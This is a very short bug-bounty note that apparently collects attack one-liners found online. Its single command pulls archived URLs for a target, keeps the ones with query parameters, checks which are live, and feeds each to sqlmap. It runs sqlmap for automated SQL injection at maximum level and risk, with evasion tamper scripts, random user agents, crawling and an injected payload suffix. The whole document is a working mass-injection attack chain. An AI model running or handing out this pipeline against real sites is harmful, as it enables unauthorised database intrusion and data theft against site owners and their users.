# Bugbounty
## 2024 Oneliners found online
waybackurls 'URL TARGET'| grep '='| httpx --silent --status-code| awk '{print $1}'| xargs -I{} sqlmap -u {} -v 3 --random-agent --tamper "between,randomcase,space2comment" --level 5 --risk 3 --batch --threads 5 --crawl 2 --suffix=') and 1=1-- -'
